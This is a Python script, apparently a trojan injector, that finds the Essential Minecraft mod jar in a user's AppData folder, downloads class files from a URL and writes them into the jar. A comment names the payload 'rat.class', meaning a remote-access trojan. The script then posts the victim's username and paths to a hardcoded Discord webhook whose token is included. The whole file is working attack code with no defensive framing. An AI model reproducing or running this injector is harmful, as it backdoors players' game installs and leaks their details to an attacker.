import os
import zipfile
import urllib.request
import getpass
import requests

def send_discord_message(webhook_url, embed):
    data = {
        'username': os.getlogin(),
        'avatar_url': 'https://media.discordapp.net/attachments/1211281395285102592/1211312968801976400/pink_mouse.png?ex=65f6f89c&is=65e4839c&hm=0043285a20b9cfa3c4c318051ebd3845201f311031b1a06039508fcbd6c2fe1d&=&format=webp&quality=lossless&width=584&height=606',
        'embeds': [embed],
    }
    response = requests.post(webhook_url, json=data)
    if response.status_code != 204:
        print(f"Failed to send message to Discord. Status code: {response.status_code}")

def get_jar_paths():
    username = getpass.getuser()
    essential_path = f"C:\\Users\\{username}\\AppData\\Roaming\\.minecraft\\essential\\Essential (forge_1.8.9).jar"
    skyclient_path = f"C:\\Users\\{username}\\AppData\\Roaming\\.minecraft\\skyclient\\essential\\Essential (forge_1.8.9).jar"
    jar_paths = []

    if os.path.exists(essential_path):
        jar_paths.append(essential_path)
    if os.path.exists(skyclient_path):
        jar_paths.append(skyclient_path)

    if not jar_paths:
        raise FileNotFoundError("Both 'Essential (forge_1.8.9).jar' not found in either 'essential' or 'skyclient' folder.")

    return jar_paths

def download_and_extract_zip(zip_url, extract_path):
    zip_filename = "temp.zip"
    urllib.request.urlretrieve(zip_url, zip_filename)

    with zipfile.ZipFile(zip_filename, 'r') as zip_ref:
        zip_ref.extractall(extract_path)

    os.remove(zip_filename)

def display_directory_structure(jar_path, target_path_inside_jar):
    with zipfile.ZipFile(jar_path, 'r') as jar_file:
        print(f"Verzeichnisbaum für {target_path_inside_jar}:")
        unique_directories = set()

        for file_path in jar_file.namelist():
            if file_path.startswith(target_path_inside_jar) and '/' in file_path[len(target_path_inside_jar):]:
                directory = file_path[len(target_path_inside_jar):].split('/', 1)[0]
                unique_directories.add(directory)

        for directory in sorted(unique_directories):
            print(f"  {directory}/")

def update_jar_file(jar_path, files_to_add):
    added_files = []
    skipped_files = []

    with zipfile.ZipFile(jar_path, 'a') as jar_file:
        existing_files = set(map(str.lower, jar_file.namelist()))

        for file_path in files_to_add:
            zip_path = f"gg/essential/{os.path.basename(file_path)}"
            if zip_path.lower() in existing_files:
                print(f"Datei {zip_path} bereits vorhanden. Überspringe die Datei.")
                skipped_files.append(zip_path)
            else:
                jar_file.write(file_path, arcname=zip_path)
                print(f"Datei {zip_path} hinzugefügt")
                added_files.append(zip_path)

    return added_files, skipped_files

def remove_temp_files(temp_extract_path):
    for file in os.listdir(temp_extract_path):
        os.remove(os.path.join(temp_extract_path, file))
    os.rmdir(temp_extract_path)

def main():
    webhook_url = "https://discord.com/api/webhooks/1219337283912863796/9HW2B1DiCazyRR35w2b5rg2jp1foYEpk15nUsxMd97f_qae8OqsosgUy50hhIhl8JXDt"                                                                    #WEBHOOK
    target_path_inside_jar = "gg/essential"                                                         #target archive inside jar
    zip_url = "URL_TO_ZIP_DOWNLOAD_WITH_CLASS_FILES"                                                #.class download in zip (eg .com/rat.zip, .zip contains rat.class, not gg/essential/rat.class)
    temp_extract_path = "temp_extract"
    jar_paths = get_jar_paths()

    for jar_path in jar_paths:
        download_and_extract_zip(zip_url, temp_extract_path)
        display_directory_structure(jar_path, target_path_inside_jar)

        files_to_add = [os.path.join(temp_extract_path, file) for file in os.listdir(temp_extract_path)]
        added_files, skipped_files = update_jar_file(jar_path, files_to_add)

        remove_temp_files(temp_extract_path)

        files_added_string = '```' + '\n'.join(added_files) + '```' if added_files else '```No files added.```'
        files_skipped_string = '```' + '\n'.join(skipped_files) + '```' if skipped_files else '```No files skipped.```'

        embed = {
            'title': 'Jar File Updated by May',
            'description': '```Essentials 1.8.9 injection successfull!```',
            'fields': [
                {'name': 'Files Added:', 'value': files_added_string},
                {'name': 'Files Skipped:', 'value': files_skipped_string},
                {'name': 'Target Directory:', 'value': f'```{target_path_inside_jar}```'},
                {'name': 'Minecraft Directory:', 'value': f'```C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\.minecraft```'},
            ],
            'color': 0xFF69B4
        }

        send_discord_message(webhook_url, embed)

if __name__ == "__main__":
    main()
